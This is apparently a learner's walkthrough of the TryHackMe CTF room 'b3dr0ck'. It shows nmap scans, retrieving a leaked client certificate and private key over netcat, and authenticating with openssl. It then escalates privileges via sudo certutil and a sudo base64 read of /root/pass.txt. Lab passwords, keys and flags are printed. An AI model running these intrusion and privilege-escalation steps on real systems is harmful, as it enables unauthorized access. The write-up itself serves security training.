[THM](https://tryhackme.com/room/b3dr0ck)

Nmap scan
```
nmap -sV -O -T4 --min-rate=10000 $ip
```
output:
```zsh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
9009/tcp open  pichat?
```

accessed the web and saw this
```Web
# Welcome to ABC!

Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...
```
a user named `Barney`
also noticed it is redirecting it to `4040` port

did all ports scan
```
nmap -sV -O -T4 -p- --min-rate=10000 $ip
```
output:
```zsh
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
9009/tcp  open  pichat?
54321/tcp open  ssl/unknown
```
got a new port `54321`

tried connecting with netcat on port `9009`
```
nc -nv $IP 9009
```
output:
```
nc -nv $ip 9009
```
output:
```Netcat
Connection to 10.48.179.48 9009 port [tcp/*] succeeded!


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? 
```
i tried `help` and *
`*` worked and it said 
`You use this service to recover your client certificate and private key`
entered `certificate` and got 
```
-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNjAxMDQxOTM2MjJaFw0yNzAxMDQxOTM2MjJaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDoGvXp
NZ1JueG62jOiCNFe4JntIrQYJaHdfNA1AfMOBwSA7iOvdZH4uUmITzoTFT4xeyYR
BgYf3VfRUB0129y1Iekfan0KOiX+lvuxuyT76URkXW5RhwbVrL1gDd6rCIYOAcOp
d3rPqYb+nENZpnHOA9gj79AN9Tfx85ug8W+LdGnNmtZ9lSgzBSsiihTZWcOQ8TJs
FngBj+4vqC1PfxtGw59AtjXpcYnv+W2+g2B8/XmQVxlgFFD20Frll+n0t/kpvLdf
Nu7dwcHs7Rb2KBEAPrHfe3tYAWHswIU+rkCBAbINNndBsACo2c98hCejJKszYgKw
zjz7x608ZSMSGjt3AgMBAAEwDQYJKoZIhvcNAQELBQADggEBAMDFFJCZVCrmjS+W
w4vJQjIm+ej4+ONjzJHc0jHDqFmbXQyjzi9edFiUkJLmiKmwWmGq+54ADApTKBf1
v7NHaJRsvmq2oPM2eTZ8lmRuq5zUmm9YyoyV/pc+aJDYN4MQgraKg+pkkxkDAS5y
Nas3DzeH33/VkI3ZdwUcC5zNpbbCRG7uegSizvRdsgWkMGcPqagvMc0XdDhgMhoB
W55h4eRpiq2/4q2pQGlKDIEPzXbU/jiZ7ghDpB6m/M6t9pwoy3H2zO5uOnOps/rI
WVhOSvmtvqTq0G7jS/TkJdu48C73Wts3i+jGTxUrmXRwKYYo7TCSVrTwfcK7z0co
1by496Y=
-----END CERTIFICATE-----
```

entered `private key` and got
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA6Br16TWdSbnhutozogjRXuCZ7SK0GCWh3XzQNQHzDgcEgO4j
r3WR+LlJiE86ExU+MXsmEQYGH91X0VAdNdvctSHpH2p9Cjol/pb7sbsk++lEZF1u
UYcG1ay9YA3eqwiGDgHDqXd6z6mG/pxDWaZxzgPYI+/QDfU38fOboPFvi3RpzZrW
fZUoMwUrIooU2VnDkPEybBZ4AY/uL6gtT38bRsOfQLY16XGJ7/ltvoNgfP15kFcZ
YBRQ9tBa5Zfp9Lf5Kby3Xzbu3cHB7O0W9igRAD6x33t7WAFh7MCFPq5AgQGyDTZ3
QbAAqNnPfIQnoySrM2ICsM48+8etPGUjEho7dwIDAQABAoIBAGZk/neTn4AW8O5t
tLmXCkbA7yceWDUO5QnBNlksMv3NOr9mT3fodi00EKyBxy0EAhvyKCj6b1k/XK6K
mVhZVlTSUPX7FI6eeISINyGBXh+EGRft3+03lFxPiHwHomPxrrIfNSJeA1/5egR5
C31RYINyTrgL481EkRm8TrwBxyPNsIDr37pKz0mMM2gzedRp3an6/TnRvzcgb/6o
OCB7ayRl4KBc/jE18p2qxsSP4HpnrBCuMczqaRE5y1znwMjZd/UBodMMGy/ANwV0
bK3FadEO6VSAiKYnu1se7Oyj7HShVxPvaQMsSbdxJrdKmnAhSg0yeF7fzcLoPZX0
KmJ9egECgYEA+LvHAIlk1pfXeoytNaz3jLd0ok9c6o3FUcDrZ2UfVfpv+UFiVVFs
7lnnnHnmguEZU6CIknIyOyaGWyuX89/GkrWpdZL0OQpLeDU1tPLsREStfBJsV4Yr
OGkEcQd/d8dHbnY51ldLtG7WgHCjvGnUuZjpRQY3wnjAOhocVjREGAcCgYEA7uLT
HySwTgaa8f+hWhL95IEmFGP+m6660o8bfbpQ7xfB90LtCWk61X9s33Dlo9uSNHR2
Pm/USkVIwQxsyQZm1quqyOkuCrlLKPD96pB2GeLf4y0qpj1cmEa5mW0CpM6SolI4
BBAHh9ZSYK44YaMJcWeAMz3agrRrUtlO453fhRECgYEAmgZ10dBC4FwAtEO+0rk8
RigokoYArMKDyP9lBo7pG63MfxZNFTYp9WM4+H3ID43iyBVl3QHYNybBFl3lZ8BP
z/Osb0FD+Lp2R4bzrgyr4A6DO4yRCJXt1624cWHKPlrp0e5mHGPMXnwwWjLmQbtr
Xk7hTLvv9X4e0xvuJjeRXysCgYEAtTP5UTZTRdxczBRMIDcnv5z3daAkEZOIww8q
m0QpADPVPenWQ70+k5QE0biheJmlXYS57MKHFY9YkJcMLbBdcZjmA2BdPGUxTez/
rl3GN/yQN5KbN150Tk3XmznFN546PEaBlxNRowg/lHaS7fztvMf1xui0R1Dz1/Re
kum+EwECgYEApmBFe/UFPTGN4sE5FBqQaHsraDguLqMjH3qXeEEEwX9/nKvjd9q/
pq6D7aqBHOO2UHbZ25bk2Pkg+VGI1oWldQz+gatonC/Bfixyvuv+Jfz4Y1qk4m1Q
0aUu+9msV3NtRhBlCpbtdyJonQUAKyBsbBWZWALEEMbdtOm1txtsmiw=
-----END RSA PRIVATE KEY-----
```
created these files in attacker machine
certificate as c
private key as id

port `54321` is open for SSL connections
connect using openssl
```
openssl s_client -connect $ip:54321 -cert c -key id
```
output:
```ssl
read R BLOCK
Welcome: 'Barney Rubble' is authorized.
b3dr0ck> 
```

trying help
```server
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```
it gave a password hint
assumed its a hash and tried to crack it and failed :(
tried login to ssh as `barney` (the user we got earlier also this says so)
```
ssh barney@$ip
```
lol it worked
 ```
 cat barney.txt
 ```
 output:
 ```flag
 THM{f05780f08f0eb1de65023069d0e4c90c}
 ```
tried `sudo -l` 
did some exploits
nothing worked
idk what to do
asked AI to what to do 
and it gave this command
```
certutil ls
```
output:
```bash
Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Jan  4 19:36 barney.certificate.pem
-rw-r----- 1 root root 1678 Jan  4 19:36 barney.clientKey.pem
-rw-r----- 1 root root  894 Jan  4 19:36 barney.csr.pem
-rw-r----- 1 root root 1674 Jan  4 19:36 barney.serviceKey.pem
-rw-r----- 1 root root  976 Jan  4 19:36 fred.certificate.pem
-rw-r----- 1 root root 1678 Jan  4 19:36 fred.clientKey.pem
-rw-r----- 1 root root  898 Jan  4 19:36 fred.csr.pem
-rw-r----- 1 root root 1674 Jan  4 19:36 fred.serviceKey.pem
```
explanation:
```
certutil is a command-line utility that can create and modify certificate and key databases. It can specifically list, generate, modify, or delete certificates, create or change the password, generate new public and private key pairs, display the contents of the key database, or delete key pairs within the key database.
```

```
barney@ip-10-48-179-48:/home/fred$ sudo certutil -a fred.csr.pem
```
enter the password of `barney`
got the certificate and id rsa 
do to exact same step to login as fred 
paasword of the fred
```password
YabbaDabbaD0000!
```

```
cat fred.txt
```
output:
```bash
THM{08da34e619da839b154521da7323559d}
```

checking what permissions does fred have
```
sudo -l
```
output:
```bash
(ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
(ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```
reading the pass
```
sudo base64 /root/pass.txt > pass.txt
cat pass.txt | base64 -d > flag.txt; cat flag.txt
```
output:
```shell
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
```
got this 
this ain't looks like the flag
went to cyberchef and used magic the paste this
`LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK`
and got this as the result
```
a00a12aad6b7c16bf07032bd05a31d56
```
this looks like a md5 hash 
used a online hash cracker to crack this
got this
```
flintstonesvitamins
```

now just switch the user
```
su
```
then paste password and get the root
read the flag
```
cat /root/root.txt
```
output:
```flag
THM{de4043c009214b56279982bf10a661b7}
```
